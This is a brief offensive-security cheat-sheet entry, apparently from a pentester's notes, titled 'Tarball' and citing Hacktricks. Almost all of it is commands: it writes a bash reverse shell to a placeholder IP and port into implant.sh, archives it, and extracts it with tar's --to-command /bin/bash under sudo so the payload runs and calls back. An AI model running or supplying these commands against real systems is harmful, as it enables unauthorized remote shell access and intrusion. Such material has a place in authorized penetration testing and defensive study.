# Tarball

```
$ echo -e '#!/bin/bash\n\nbash -i >& /dev/tcp/<IP>/<PORT> 0>&1' > implant.sh
tar -cvf implant.tar implant.sh
sudo -u $USER tar -xvf implant.tar --to-command /bin/bash
```

---
## References

### Hacktricks

- [Hacktricks: Shells Linux](https://book.hacktricks.wiki/en/shells/shells/linux.html)